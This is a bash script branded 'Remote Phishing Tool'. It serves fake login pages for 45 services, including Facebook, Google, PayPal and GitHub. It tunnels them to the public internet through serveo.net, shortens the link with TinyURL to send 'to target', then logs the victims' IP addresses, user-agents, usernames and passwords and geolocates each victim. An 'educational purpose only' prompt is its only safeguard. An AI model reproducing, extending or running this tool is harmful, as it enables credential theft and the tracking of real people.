#!/bin/bash

my() {
printf "\e[1;92m[\e[0m*\e[1;92m] Please wait...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Checking Network and System Configuration...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; } 
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send this direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or can send this tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
vikas

}

aim() {
account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for Next IP and Next Credentials, '\033[3;31m''\033[1;31m'or Press Ctrl + C to exit...\e[0m\n"
}

is() {
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ;
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Adobe \e[0m"
printf "           \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Badoo \e[0m " 
printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Blogger \e[0m "
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
printf "             \e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Box \e[0m "
printf "            \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m CryptoCurrency \e[0m "
printf " \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Dropbox \e[0m " 
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Ebay \e[0m "
printf "           \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Facebook \e[0m "
printf "       \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Github \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Gitlab \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Godaddy \e[0m "
printf "        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Google \e[0m "
printf "\n" 
printf "             \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Insta Followers \e[0m "
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Instagram \e[0m "
printf "      \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m jimdo \e[0m " 
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Joomla \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Kiwi-box \e[0m "
printf "       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Line \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Linkedin \e[0m "
printf "       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Meetup \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Messenger-FB \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Microsoft \e[0m "
printf "      \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m netflix \e[0m "
printf "        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Netscape \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Origin \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m Paypal \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Pinterest \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m ProtonMail \e[0m "
printf "     \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m Reddit \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Skype \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Snapchat \e[0m "
printf "       \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m Snapfish \e[0m "
printf "       \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Sony \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Spotify \e[0m "
printf "        \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;93m SquareSpace \e[0m "
printf "    \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Steam \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m TheDots \e[0m "
printf "        \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;93m Twitch \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Twitter \e[0m "
printf "\n"
printf "             \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Verizon \e[0m "
printf "        \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;93m Wikipedia \e[0m "
printf "      \e[1;92m[\e[0m\e[1;77m42\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Wordpress \e[0m "
printf "\n"
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ;
printf " \e[1;92m[\e[0m\e[1;77m43\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Yahoo \e[0m "
printf "          \e[1;92m[\e[0m\e[1;77m44\e[0m\e[1;92m]\e[0m\e[1;93m Yandex \e[0m "
printf "         \e[1;92m[\e[0m\e[1;77m45\e[0m\e[1;92m]\e[0m\e[1;93m\033[3;33m Yelp \e[0m "
for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
printf "\n"
   
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option

if [[ $option == 1 || $option == 01 ]]; then
server="adobe"
dehumanized

elif [[ $option == 2 || $option == 02 ]]; then
server="badoo"
dehumanized

elif [[ $option == 3 || $option == 03 ]]; then
server="blogger"
dehumanized

elif [[ $option == 4 || $option == 04 ]]; then
server="box"
dehumanized

elif [[ $option == 5 || $option == 05 ]]; then
server="cryptocurrency"
dehumanized

elif [[ $option == 6 || $option == 06 ]]; then
server="dropbox"
dehumanized

elif [[ $option == 7 || $option == 07 ]]; then
server="ebay"
dehumanized

elif [[ $option == 8 || $option == 08 ]]; then
server="facebook"
dehumanized

elif [[ $option == 9 || $option == 09 ]]; then
server="github"
dehumanized

elif [[ $option == 10 || $option == 010 ]]; then
server="gitlab"
dehumanized

elif [[ $option == 11 || $option == 011 ]]; then
server="godaddy"
dehumanized

elif [[ $option == 12 || $option == 012 ]]; then
server="google"
dehumanized

elif [[ $option == 13 || $option == 013 ]]; then
server="instafollowers"
dehumanized

elif [[ $option == 14 || $option == 014 ]]; then
server="instagram"
dehumanized

elif [[ $option == 15 || $option == 015 ]]; then
server="jimdo"
dehumanized

elif [[ $option == 16 || $option == 016 ]]; then
server="joomla"
dehumanized
elif [[ $option == 17 || $option == 017 ]]; then
server="kiwibox"
dehumanized

elif [[ $option == 18 || $option == 018 ]]; then
server="line"
dehumanized

elif [[ $option == 19 || $option == 019 ]]; then
server="linkedin"
dehumanized

elif [[ $option == 20 || $option == 020 ]]; then
server="meetup"
dehumanized

elif [[ $option == 21 || $option == 021 ]]; then
server="messenger"
dehumanized

elif [[ $option == 22 || $option == 022 ]]; then
server="microsoft"
dehumanized

elif [[ $option == 23 || $option == 023 ]]; then
server="netflix"
dehumanized

elif [[ $option == 24 || $option == 024 ]]; then
server="netscape"
dehumanized

elif [[ $option == 25 || $option == 025 ]]; then
server="origin"
dehumanized

elif [[ $option == 26 || $option == 026 ]]; then
server="paypal"
dehumanized

elif [[ $option == 27 || $option == 027 ]]; then
server="pinterest"
dehumanized

elif [[ $option == 28 || $option == 028 ]]; then
server="protonmail"
dehumanized

elif [[ $option == 29 || $option == 029 ]]; then
server="reddit"
dehumanized

elif [[ $option == 30 || $option == 030 ]]; then
server="skype"
dehumanized

elif [[ $option == 31 || $option == 031 ]]; then
server="snapchat"
dehumanized

elif [[ $option == 32 || $option == 032 ]]; then
server="snapfish"
dehumanized

elif [[ $option == 33 || $option == 033 ]]; then
server="sony"
dehumanized

elif [[ $option == 34 || $option == 034 ]]; then
server="spotify"
dehumanized

elif [[ $option == 35 || $option == 035 ]]; then
server="squarespace"
dehumanized

elif [[ $option == 36 || $option == 036 ]]; then
server="steam"
dehumanized

elif [[ $option == 37 || $option == 037 ]]; then
server="thedots"
dehumanized

elif [[ $option == 38 || $option == 038 ]]; then
server="twitch"
dehumanized

elif [[ $option == 39 || $option == 039 ]]; then
server="twitter"
dehumanized

elif [[ $option == 40 || $option == 040 ]]; then
server="verizon"
dehumanized

elif [[ $option == 41 || $option == 041 ]]; then
server="wikipedia"
dehumanized

elif [[ $option == 42 || $option == 042 ]]; then
server="wordpress"
dehumanized

elif [[ $option == 43 || $option == 43 ]]; then
server="yahoo"
dehumanized

elif [[ $option == 44 || $option == 044 ]]; then
server="yandex"
dehumanized

elif [[ $option == 45 || $option == 045 ]]; then
server="yelp"
dehumanized

else
echo -e '               \033[1;31m[!]Invalid Selection! \e[0m \033[47m\033[5;31m ACCESS DENIED \e[0m'
sleep 3
clear
is
fi
}

to() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for Login  Credentials => Username and Password...\e[0m\n"

}

humanize() {
clear
echo -e '         \033[42m''\033[1;37m'      " .----------------. '\033[1;31m\033[43m' .----------------. '\033[1;40m\033[7;34m' .----------------. \e[0m"
echo -e '         \033[42m''\033[1;37m'      "| .--------------. |'\033[1;31m\033[43m'| .--------------. |'\033[1;40m\033[7;34m'| .--------------. |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| |  _______     | |'\033[1;31m\033[43m'| |   ______     | |'\033[1;40m\033[7;34m'| |  _________   | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| | |_   __ \    | |'\033[1;31m\033[43m'| |  |_   __ \   | |'\033[1;40m\033[7;34m'| | |  _   _  |  | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| |   | |__) |   | |'\033[1;31m\033[43m'| |    | |__) |  | |'\033[1;40m\033[7;34m'| | |_/ | | \_|  | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| |   |  __ /    | |'\033[1;31m\033[43m'| |    |  ___/   | |'\033[1;40m\033[7;34m'| |     | |      | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| |  _| |  \ \_  | |'\033[1;31m\033[43m'| |   _| |_      | |'\033[1;40m\033[7;34m'| |    _| |_     | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| | |____| |___| | |'\033[1;31m\033[43m'| |  |_____|     | |'\033[1;40m\033[7;34m'| |   |_____|    | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| |    REMOTE    | |'\033[1;31m\033[43m'| |   PHISHING   | |'\033[1;40m\033[7;34m'| |     TOOL     | |\e[0m"
echo -e '         \033[42m''\033[1;37m'      "| '--------------' |'\033[1;31m\033[43m'| '--------------' |'\033[1;40m\033[7;34m'| '--------------' |\e[0m"
echo -e '         \033[42m''\033[1;37m'      " '----------------' '\033[1;31m\033[43m' '----------------' '\033[1;40m\033[7;34m' '----------------' \e[0m"
echo

printf "\e[1;93m       .:.:.\e[0m\e[1;77m Remote Phishing Tool coded ✍️ By  \033[1;31m ▄︻̷̿┻̿═━一  \033[5;32m𝓥 𝓘 𝓚 𝓐 𝓢    𝓒 𝓗 𝓐 𝓤 𝓓 𝓗 𝓐 𝓡 𝓨   \e[0m""\e[1;93m.:.:.\e[0m"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Published By =>\033[4;32m www.gkaim.com \e[0m \e[1;93m.:.:.  \e[0m"  
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Version => \033[4;32m 1.0.0 \e[0m \e[1;93m.:.:. \e[0m"
printf "\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Only For Educationl Purpose,Please don't Use it for Illegal Purpose   ::\e[0m\n"
printf "\n"
}
the() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port or hit Enter (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
my

}


dehumanized() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi


printf "\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Type \033[41m RPT \e[0m \033[1;32mif you agree to use it only Educational Purpose: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == RPT || $option_server == rpt ]]; then
the
else
echo -e '               \033[1;31m[!] Ok Then Press ctrl + c \e[0m \033[47m\033[5;31m ACCESS DENIED \e[0m'
sleep 3
clear
dehumanized
fi

}


vikas() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For IP's and Credentials...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
to
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
aim
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
done 

}

trap 'printf "\n";start;exit 1' 2
agree() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]SO [!] Do you agree to use this tool for educational purposes only? [y/N] >  \e[0m\en' ag
if  [[ $ag == Y || $ag == y ]]; then
hrfp
elif [[ $ag == N || $ag == n ]]; then
exit
else
exit
fi
}
hrfp() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}
start() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

humanize
agree
hrfp
is
